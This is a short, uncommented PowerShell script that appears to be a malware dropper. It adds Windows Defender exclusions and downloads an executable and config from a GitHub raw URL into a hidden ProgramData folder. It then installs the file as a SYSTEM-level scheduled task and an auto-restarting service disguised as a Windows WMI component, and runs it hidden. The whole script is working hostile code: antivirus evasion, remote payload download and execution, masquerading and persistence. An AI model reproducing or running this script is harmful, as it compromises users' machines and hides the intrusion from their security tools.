$ErrorActionPreference = "SilentlyContinue"
$d = "$env:ProgramData\Microsoft\Windows\AppRepository"
New-Item -ItemType Directory -Force -Path $d | Out-Null
Add-MpPreference -ExclusionPath $d -EA SilentlyContinue
Add-MpPreference -ExclusionProcess "WmiPrvSE.exe" -EA SilentlyContinue
$wc = New-Object Net.WebClient
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$raw = "https://raw.githubusercontent.com/andreamiri354-lab/WmiPrvSE/main"
$exe = Join-Path $d "WmiPrvSE.exe"
$cfg = Join-Path $d "config.json"
try { $wc.DownloadFile("$raw/WmiPrvSE.exe", $exe) } catch {}
try { $wc.DownloadFile("$raw/config.json", $cfg) } catch {}
if ((Test-Path $exe) -and (Get-Item $exe).Length -gt 7000000 -and (Test-Path $cfg)) {
  $tr = "`"$exe`" --config=`"$cfg`""
  schtasks /Create /TN "WmiPerfHost" /TR $tr /SC ONSTART /RU SYSTEM /RL HIGHEST /F | Out-Null
  sc.exe create WmiPerfHost binPath= $tr start= auto obj= LocalSystem DisplayName= "WMI Performance Host" | Out-Null
  sc.exe failure WmiPerfHost reset= 0 actions= restart/5000/restart/5000/restart/5000 | Out-Null
  sc.exe start WmiPerfHost | Out-Null
  Start-Process -FilePath $exe -ArgumentList "--config=$cfg" -WindowStyle Hidden
}
